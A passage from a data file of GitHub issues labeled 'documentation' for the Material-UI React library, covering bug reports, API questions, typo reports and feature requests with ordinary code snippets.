-> don't display it obviously\r\n* Space (`' '`) helperText provided, show placeholder space for a potential helperText later\r\n\r\nRelated to #2474\r\n\r\nMaybe the component's API could be revisited to handle these use cases more easily? Make it easier to pass in helperText, and errorHelperText together for example?"},{"labels":[null,"documentation",null],"text":"https://codesandbox.io/s/8gpxl"},{"labels":[null,"documentation",null],"text":"--------------^ Click \"Preview\" for a nicer view!\r\n\r\nWe use GitHub issues exclusively as a bugs and feature request tracker.\r\n\r\nFor support, please check out https://material-ui.com/getting-started/support/. Thanks!\r\n------------------------------------\r\nabout Slier's 'onChangeCommitted'  param type.\r\nWhy the type of param 'value' is not 'number' but 'any'?\r\n\r\n![Screen Shot 2020-02-16 at 6 04 46 PM](https://user-images.githubusercontent.com/15071167/74602875-3f214080-50e8-11ea-9910-53d71dea2d03.png)\r\n![Screen Shot 2020-02-16 at 6 05 54 PM](https://user-images.githubusercontent.com/15071167/74602881-4e07f300-50e8-11ea-9903-515afb22418b.png)\r\n"},{"labels":[null,"documentation",null,null],"text":"## Summary 💡\r\n\r\nHaving a preview of the icons in the editor is similar to having autocomplete available for the API. Our icons explorer is definitely helpful and better if you need inspiration. But if you know what kind of icon you want then in-editor preview should boost productivity.\r\n\r\n## Examples 🌈\r\n\r\n1. link to icons explorer in SvgIcon.d.ts jsdoc\r\n2. This shows a preview (vscode) when hovering over an imported icon\r\n  ```ts\r\n  import SvgIcon from '@material-ui/core/SvgIcon';\r\n  /**\r\n   * Preview: ![LockIcon](https://fonts.gstatic.com/s/i/materialicons/lock/v4/24px.svg)\r\n   */\r\n  declare const LockIcon: typeof SvgIcon;\r\n  export default LockIcon;\r\n  ```\r\n  credit to @leMaik for the markdown idea.\r\n  ![icon-preview](https://user-images.githubusercontent.com/12292047/74522654-e8ffa200-4f1b-11ea-9410-46c119965c88.png)\r\n\r\n3. Show icon preview in autocomplete (probably requires IDE extension)\r\n\r\n## Motivation 🔦\r\n\r\nSeemed like a useful thing to have to me.\r\n\r\nEach of the examples can be explored further and implemented by whomever is looking for some work to do."},{"labels":[null,"documentation",null],"text":"\r\nIn the [Swipable Drawer API](https://material-ui.com/api/swipeable-drawer/) documentation, more clarity could be added to how to utilise ```SwipeAreaProps``` on the Swipe Area. Maybe add a brief example. I couldn't find any sandbox examples of it being used.\r\n\r\nIn the mean time, does anybody have examples of where this feature is used? Or how I might use it? Can it be used for Styling it? Maybe not have it close fully to become like a mini variant drawer that can be swiped on the phone?\r\nSo far in the documentation it just highlights its an object and what its used for:\r\n```Props applied to the swipe area element.```\r\n\r\nDoes it have the same rules as makeStyles ?\r\n\r\n--\r\n--------------^ Click \"Preview\" for a nicer view!\r\n\r\nWe use GitHub issues exclusively as a bugs and feature request tracker.\r\n\r\nFor support, please check out https://material-ui.com/getting-started/support/. Thanks!\r\n"},{"labels":["documentation"],"text":"<!-- Provide a general summary of the feature in the Title above --> \r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\nA tooltip to appear on hover, click and mousedown over button icons of the Mini Variant Drawer to give the title or description (or both) of the buttons purpose.\r\n\r\nMaybe just include Material UI's tool tip example as part of the Mini Variant Drawer example if it's easy to do (on at least one of the icons).\r\n\r\nI am open to expanding this feature request to all or multiple components too. Just looking for suggestions now.\r\n\r\nIf this is more of a Support issue than a Feature Request, I am willing to edit this issue for such. Just let me know.\r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\nI managed to add [Material UI Tooltip](https://material-ui.com/components/tooltips/#tooltip) into [sandbox example](https://codesandbox.io/s/material-demo-mg169) of the Mini Variant Drawer. It's easy to set up but needs more styling because there is too much space between the popup box and icon on hover.\r\n\r\nFacebook's example would be a good milestone to reach with this. \r\n<img width=\"208\" alt=\"Screenshot 2020-02-10 at 15 01 03\" src=\"https://user-images.githubusercontent.com/22279028/74161034-3f1bcf00-4c16-11ea-801a-d2006c08bea1.png\">\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI think it could be a useful feature to demonstrate. Especially when you only have so much space for your buttons with little description. It will provide an optional feature for more clarity.\r\n\r\nThe case of the Mini Variant Drawer (when closed) is a good example of this.\r\nIt could add more clarity. Keep it as an optional feature for this component.\r\n\r\nWilling to create a PR on this and try it myself."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\nadding an option to material-UI table called orientation to specify the orientation of the table specifically setting the table in a vertical or horizontal orientation the default is horizontal\r\n<!-- Describe how it should work. -->\r\n\r\n## Examples 🌈\r\n```html\r\n<Table className={classes.table} orientation=\"vertical\" aria-label=\"customized table\">\r\n        <TableHead>.....</TableHeader>\r\n        <TableBody>......</TableBody>\r\n</Table>\r\n```\r\n![alt text](https://www.nichepursuits.com/wp-content/uploads/2019/03/comparisontable.png)\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\n## Motivation 🔦\r\n\r\nI'm building right now an e-commerce app using material-ui and i want a table for comparing multiple products those tables, in general, have a vertical header instead of the common horizontal one so it will be easier for me if the orientation of the header property already exists in the component it will save me a lot of time and gave me the ability to use one customer table component  for all my needs\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":[null,"documentation",null],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe APIs for `TablePagination` and `Pagination` behave differently.\r\n\r\n1. Why is the `count`-prop for `TablePagiantion` the total number of items the pagination controls while for `Pagination` it is the total number of pages?\r\n1. Why is the `page`-prop for `TablePagination` a zero-based index while for `Pagination` it is not.\r\n1. Why does the `Pagination` component not take care of the number of pages based on the item count and number of items per page itself? Now the API either requires a hardcoded page number or for anyone who uses the component to make sure that the number of pages is properly rounded up.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe APIs behave in the same way where it makes sense.\r\n\r\n## Steps to Reproduce 🕹\r\nN/A\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.2  |"},{"labels":[null,"documentation",null],"text":"Bug Demo: https://codesandbox.io/s/material-demo-q3fno\r\n\r\n![autocomplete](https://user-images.githubusercontent.com/30294752/73972400-d7be0080-4931-11ea-8d5f-40c8499d8752.png)\r\n\r\n"},{"labels":["documentation",null],"text":"Actually not a support request, but a note to help people in the future.\r\n\r\nThe link you mention [here](https://github.com/mui-org/material-ui/blob/master/CONTRIBUTING.md#4-you-are-done-) resolves to an old PR. Since that PR was merged, the docs system has changed a bit. Files, that were changed in the PR, do not exist any more.\r\n\r\nPlease update this link to a newer PR, so new contributors aren't confused.\r\n\r\nExample PRs you could use: \r\n- #15149\r\n- #17401\r\n- #18220\r\n- #19582 (disclamer: that one is by me :grin:)"},{"labels":["documentation",null],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nI'm overriding `MuiBaseInput` with\r\n```typescript\r\ncreateMuiTheme({\r\n  overrides: {\r\n    MuiInputBase: {\r\n      error: {\r\n        ...\r\n```\r\n\r\nBut styles for `Mui-error` class is missing\r\n\r\nIf I use `withStyles` and `classes={{ error: classes.error }}` everything is ok.\r\n\r\n## Expected Behavior 🤔\r\n\r\nMy styles applied for `Mui-error` class\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n[Sandbox demo](https://codesandbox.io/s/sharp-chandrasekhar-02k2q)\r\n\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.1  |\r\n| React       |    react@16.12.0     |\r\n| Browser     |    Brave Version 1.2.43 Chromium: 79.0.3945.130 (Official Build) (64-bit)     |\r\n| TypeScript  |   3.7.3      |\r\n"},{"labels":["documentation",null],"text":"I'm using CRA and the icons from material-ui, so I'm using only partial (named) imports like so:\r\n```\r\nimport { Add, Check } from '@material-ui/icons';\r\n```\r\n\r\nI've read the page from the documentation about [minimizing bundle size](https://material-ui.com/guides/minimizing-bundle-size), but the information there about CRA seems to be a bit old. However, I'm not sure if that's 100% true. I tried researching, but found nothing. So, my question is - using CRA and named imports from material-ui, do I need to do anything to enable bundle size minimization?\r\n\r\nGiven that more and more people are using CRA, even for production, it would be best to add a section in the documentation for bundle size minimization specifically for applications, created with Create React App."},{"labels":["documentation"],"text":"\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nToday I discovered that materialui provides a set of color manipulation helpers under `@material-ui/core/styles/colorManipulator`.\r\nI searched through the docs and I didn't saw any reference to any of the methods contained there, albeit they areextremelyy useful.\r\n\r\n\r\n## Motivation 🔦\r\n\r\nI am pretty sure that there is a lot of people which are using material-ui looking for small libraries for this kind of simple tasks and having this will be very handy.\r\n"},{"labels":["documentation",null],"text":"makeStyles does not fall back to the component name if no `name` option is provided.\r\n\r\nAccording to the docs the generated classname should include the component name when no `name` option is provided:\r\n\r\n> options.name (String [optional]): The name of the style sheet. Useful for debugging. If the value isn't provided, it will try to fallback to the name of the component.\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nHere is an example component:\r\n```\r\nconst useStyles = makeStyles(\r\n  {\r\n    root: {}\r\n  }\r\n);\r\n\r\nexport function MyComponent() {\r\n  const classes = useStyles({});\r\n  return <div className={classes.root}>YEAH</div>;\r\n}\r\n```\r\n\r\nThe generated classname looks like this:\r\n`makeStyles-root-123`\r\n\r\nOnly when you provide a name option you get correct classname:\r\n```\r\nconst useStyles = makeStyles(\r\n  {\r\n    root: {}\r\n  },\r\n  {\r\n    name: \"MyComponent\"\r\n  }\r\n);\r\n```\r\nWiell generate`MyComponent-root-123`\r\n\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe generated classname looks like this without providing a name option.\r\n`MyComponent-root-123`\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/s/epic-sinoussi-7mktq\r\n\r\nWhen no `name` option is set in makeStyles then i never get the component name in the classname. Even if compoent has a displayname set or is a named function.\r\n\r\n## Context 🔦\r\n\r\nThe goal is to have good looking classnames like `MyComponent-root-123` instead of `makeStyles-root-123`\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.0  |\r\n\r\n"},{"labels":["documentation",null],"text":"I was wondering if anybody could tell me what the differences are between the Lab and Core components. What is required of a component before it can move from the lab to the core package? "},{"labels":[null,"documentation",null],"text":"I wanted to render Backdrop server side and use it as sort of a loading indicator before the javascript is downloaded. This does not work; I guess because of the Fade wrapping it. Setting transitionDuration to 0 doesn't help either.\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate."},{"labels":["documentation",null],"text":"I would suggest for the [sorting](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/components/tables/EnhancedTable.tsx) examples some name changes that make it clearer what is going on.\r\n\r\ncmp -> comparator or cmp\r\n\r\ndesc -> descendingComparator or descCmp\r\n\r\ngetSorting -> getComparator or getCmp\r\n\r\nK -> Key? or KeyType?  I'm not sure what this should be called because I haven't learned what \"key in K\" means.\r\n\r\nThanks!"},{"labels":["documentation"],"text":"## Summary\r\n\r\n<!-- Provide a general summary of the feature in the Title above -->\r\n**mui-treasury/layout** tutorial just released a few days ago and had a chat with @oliviertassinari to add it as related projects. One more I think we can add link to Card section in mui-treasury for other developers to see an example of customization.\r\n\r\nHere is what I will do for this issue\r\n- add [mui-treasury/layout tutorial](https://mui-treasury.com/layout/tutorials/dashboard-layout) to related project \r\n- add link to [mui-treasury/card](https://mui-treasury.com/components/card)\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate."},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nTypo under caption section of the Table component docs\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nA **barbone** structure table example with a caption\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\nA **barebone** structure table example with a caption\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. Goto <https://material-ui.com/components/tables/#caption>\r\n<img width=\"1166\" alt=\"Screenshot 2020-01-19 at 8 46 47 PM\" src=\"https://user-images.githubusercontent.com/18426392/72683400-0ac45f80-3afd-11ea-9b96-59043ed83e62.png\">\r\n\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.?.?  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":["documentation"],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary\r\n\r\nProviding two base Codesandboxes (one for javascript, one for Typescript) in the issue templates. For example, [Fabric.js](https://github.com/fabricjs/fabric.js/issues/new?template=bug_report.md) and [Prosemirror](https://github.com/ProseMirror/prosemirror/issues/new) already do it and it makes submitting a bug a pleasing process.\r\n\r\n## Motivation\r\n\r\nEverytime I wanted to report a bug in the library I had to create a Codesandbox from scratch. This is problematic because:\r\n- it is not trivial to correctly setup a base Codesandbox, i.e. it takes time and this is the least thing you want to do when you are angry because you discovered a bug in the library. Moreover, for reporting TypeScript bugs, I can't even figure out how to setup a base Codesandbox\r\n- everybody that wants to report a bug has to do the exact same thing again and again. This is a big waste of time\r\n\r\nIf you provide such base codesandboxes, people will be much more inclined to attach repros to their bug reports, but also (and this is the more important), will be much more inclined to submit the bugs they encounter.\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n![image](https://user-images.githubusercontent.com/43670376/72603270-61754200-3921-11ea-82e0-00d54e271e1a.png)\r\n\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. Go to https://material-ui.com/components/autocomplete/#customized-hook\r\n2. Change to dark theme\r\n3. Click on the input\r\n4. Choose a value and click on it\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.8.3  |\r\n| Browser     |     chrome 79    |\r\n"},{"labels":["documentation",null],"text":"Hey there,\r\n\r\nso the only way i could find to do it in `createMuiTheme()` is:\r\n\r\n```\r\noverrides: {\r\n  MuiToolbar: {\r\n      gutters: {\r\n        '@media (min-width: 600px)': {\r\n          paddingLeft: 0,\r\n          paddingRight: 0,\r\n        },\r\n      },\r\n    },\r\n  }\r\n```\r\nProblem here is that i need to come up with my own breakpoint values while it should rather use the `[theme.breakpoints.up('sm')]` approach of `makeStyles()`, using the default themes' breakpoint presets as values.\r\n\r\nIs something like this or equivalent possible? If not, could this maybe be put on the ToDo list. I noticed a lot of people requiring this.\r\n\r\nThanks in advance."},{"labels":["documentation",null,null],"text":"* sets to reproduce : \r\n* go on [this page](https://material-ui.com/components/cards/) \r\n* click on \"edit this page\" button\r\n* 404 ! :)\r\n\r\nThere is a misconfiguration in the static generator path configuration : \r\nActual Button path : \r\n```\r\nhttps://github.com/mui-org/material-ui/blob/master/docs/src/docs/src/pages/components/cards/cards.md\r\n```\r\nReal path :\r\n```\r\nhttps://github.com/mui-org/material-ui/blob/master/docs/src/pages/components/cards/cards.md\r\n```\r\n\r\nHere is the double copy typo in the button path : `docs/src/docs/src`\r\n\r\nRegards.\r\n"},{"labels":[null,"documentation",null],"text":"## Current Behavior 😯\r\nHi i'm Florian,\r\n\r\ni've encountered a problem with the Autocomplete component that you can see here : \r\n`<Autocomplete\r\n            id=\"conducteur\"\r\n            renderInput={ (params:RenderInputParams) => (\r\n                <TextField\r\n                    {...params}\r\n                    variant=\"standard\"\r\n                    label=\"Veuillez choisir le conducteur\"\r\n                    fullWidth\r\n                />\r\n            )}\r\n            renderOption={ (option: Person) => (<Typography noWrap>{`${option.prenom} ${option.nom}`}</Typography>) }\r\n            options={persons}          \r\n            value={data.conducteur}\r\n            onChange={(event: object,person: Person) => \r\n                { \r\n                    setData( oldState => {\r\n                        oldState?.conducteur = person\r\n                        return oldState\r\n                    })\r\n                }\r\n            }\r\n            getOptionSelected={(option, value) => option.id === value.id }\r\n            renderTags={(value: Person[], getTagProps) => value.map((option: Person, index: number) => (\r\n                <Chip variant=\"outlined\" key={index} label={`${option.prenom} ${option.nom}`} {...getTagProps({ index })} />\r\n                ))}\r\n        />`\r\nSo i've put something in renderOptions but on my web browser i found this error : \r\n![image](https://user-images.githubusercontent.com/18530808/72169616-c4218780-33cf-11ea-9043-6dbcc98a8d06.png)\r\n\r\nbut i checked the source code and getOptionLabel shouldn't be called if renderOption is fill.\r\nInteresting or not when i put the property multiple it works fine but without it doesn't work.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe expected Behavior should be no error if renderOption is fill in the case of a standard autocomplete without multiple property and with renderOption filled.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nI've done a codeSandBox to reproduce the problem simply :\r\nhttps://codesandbox.io/s/tender-gates-13t51\r\n\r\n## Context 🔦\r\n\r\nI'm trying to select a person into a list of person which his the driver of a car in my app.\r\n\r\ni'm ont the latest version of material ui and lab.\r\n\r\nif you need more details please tell me i'll will be please to help you. \r\n\r\nThank you guys for taking the time to read this."},{"labels":[null,null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nI have been testing out the context menu demo here <https://material-ui.com/components/menus/#context-menu>\r\n\r\nIf you right-click to open the context menu, then right click on another page element (that should not trigger the material menu) while the menu is open. The menu moves to the new location.\r\n\r\nIt appears the clickawaylistener might be responding incorrectly in these cases.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe material context menu closes and the context menu for the element I clicked on opens.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n1. Go to: https://material-ui.com/components/menus/#context-menu\r\n2. Trigger the demo context menu\r\n3. Right click on some other element while the demo context is open.\r\n"},{"labels":[null,"documentation",null],"text":"When using the \"multiple\" prop on a Select with variant=\"outlined\", the outline runs through the label.\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nAn outline appears through the label of the Select.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThere should be a gap in the outline around the label.\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/s/material-demo-p5bpd\r\n\r\nSteps:\r\n\r\n1. Focus the Select\r\n2. *Notice that the outline appears through the label*\r\n\r\n## Context 🔦\r\nUsing the outlined style inputs in a form.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.8.3  |\r\n| React       | 16.10.0 |\r\n| Browser     | Chrome |\r\n| TypeScript  | v3.7.2 |\r\n"},{"labels":["documentation",null,null],"text":"\r\n## Summary 💡\r\n\r\nWhen I click to copy code or links to code I want a snackbar to pop up to let me know the text has been copied.\r\n\r\n## Examples 🌈\r\n\r\n<img width=\"271\" alt=\"Example Usage\" src=\"https://user-images.githubusercontent.com/38309438/71858416-0c733980-30a0-11ea-9f0d-35f56cb23511.png\">\r\n\r\nWhen I press copy I want a to see a snackbar to let me know text has been copied.\r\n\r\n## Motivation 🔦\r\n\r\nIt annoys me when I can't tell if I have successfully copied or not.\r\n\r\nThis would solve that problem."},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nBrowsing `v4-7-2.` docs, the code example points to master: https://v4-7-2.material-ui.com/components/snackbars/#customized-snackbars\r\n\r\nBrowsing the latest version of docs, the code examples point to master and not to the latest released version: https://material-ui.com/components/snackbars/#customized-snackbars\r\n\r\nIn this particular case, the code example is not usable as the `Alert` component hasn't been released yet.\r\n\r\n## Expected Behavior 🤔\r\n\r\nA specific version of the doc should reference the same specific version of the code. The current version should reference the latest release."},{"labels":["documentation"],"text":"I am a product manager and design lead for a design team using Material as a framework for group of applications that will require both light and dark mode.\r\n\r\nWe are attempting to give the designers some guidelines for how material applies `default.background` and `default.paper` and how those colors transition when switching from light to dark and vice versa. Material-UI's Theme page (https://material-ui.com/customization/default-theme/) displays the hex values for light mode, but does not display the corresponding hex codes for dark mode when toggling to the dark theme.\r\n\r\nThe original attempt to remedy this issue was by using a color picker tool to \"test\" colors in light and dark mode while viewing them on www.material-ui.com. We also used the `theme` console command to determine what the theme properties were on www.material-ui.com. It quickly became apparent that Material-UI was not applying the default material theme to their own documentation website:\r\n\r\nLight mode `default.background` color in the default theme is `#FAFAFA`, www.material-ui.com uses `#FFF` as their `default.background`; furthermore, www.material-ui.com uses two additional levels that are not found in the Material-UI theme: `default.level1` and `default.level2`.\r\n\r\nSome clarity on how Material-UI's default theme applies color to components in light and dark mode would help us build an accurate design library and ensure that toggling between light and dark mode in applications is seamless."},{"labels":["documentation",null],"text":"Shouldn't this change be documented in the [migration guide](https://material-ui.com/guides/migration-v3/)? It renames `convertHexToRGB` to `hexToRgb` (breaking the API), but isn't documented.\r\n\r\n_Originally posted by @zettca in https://github.com/mui-org/material-ui/pull/14391#issuecomment-568519662_"},{"labels":["documentation"],"text":"Hi there, I hope this is in the right place. I am trying to use the component prop of \"Drawer\" to set it to use the \"nav\" html element. The [drawer API](https://material-ui.com/api/drawer/) states: \r\n\r\n> Any other props supplied will be provided to the root element (native element).\r\n\r\nI have had this working before moving to typescript. In typescript I get the error \"Property 'component' does not exist on type 'IntrinsicAttributes & DrawerProps'\". [Here](https://material-ui.com/guides/typescript/#usage-of-component-prop) in the docs I found the following \r\n\r\n> Not every component fully supports any component type you pass in. If you encounter a component that rejects its component props in TypeScript please open an issue. There is an ongoing effort to fix this by making component props generic.\r\n\r\nI am assuming (and hoping) this is the case. Could you please confirm if this is the case and / or let me know if i'm being dumb (apologies).\r\n\r\nMany thanks for reading, looking forward to a response"},{"labels":["documentation"],"text":"- No explicit instructions about what the package manager should be used for contributing to the project.\r\n- There should be instructions on how one should install project dependencies in the root directory before starting the project.\r\n![missing-dependencies](https://user-images.githubusercontent.com/51196367/71412490-e5fed880-2673-11ea-8bb1-5ad422fc11cf.png)\r\n\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\n\r\nExpose `RadioGroupContext` via `useRadioGroup` Hook (cf. [`useFormControl`](https://github.com/mui-org/material-ui/blob/bf423404742177620f3af9b9eaafb146eafc5774/packages/material-ui/src/FormControl/index.js#L2)).\r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\nhttps://codesandbox.io/s/material-demo-9w4yc\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI'd like the ability to easily work out whether a wrapped `Radio` is `checked`, so I can apply custom styling to a `checked` label, for example (see demo above). In MUI v3, this was possible because `RadioGroup` would use `cloneElement` and pass `checked` prop to `children`. With the new context implementation (https://github.com/mui-org/material-ui/pull/15069), I now need to hook into the context but because it's not part of public API, I'd need to use a Babel transform to import the correct module (CJS vs ESM) in my library output:\r\n\r\n- `@material-ui/core/RadioGroup/RadioGroupContext`\r\n- `@material-ui/core/esm/RadioGroup/RadioGroupContext`\r\n\r\n@oliviertassinari has pointed out that we're currently exposing `FormControlContext` via a custom [`useFormControl`](https://github.com/mui-org/material-ui/blob/bf423404742177620f3af9b9eaafb146eafc5774/packages/material-ui/src/FormControl/index.js#L2) Hook, so we could probably do the same in this instance? I'm happy to raise a PR for this.\r\n\r\nPrior art: https://github.com/mui-org/material-ui/issues/11865"},{"labels":["documentation"],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\nMaterial Studies are very nice showcases and presets as a starting point for new projects. The main page can be found here:\r\nhttps://material.io/design/material-studies/about-our-material-studies.html\r\n\r\nIt would be great if Material-UI would introduce `presets` additionally to the current theming of a default light and dark theme.\r\n\r\n## Examples 🌈\r\nThis is 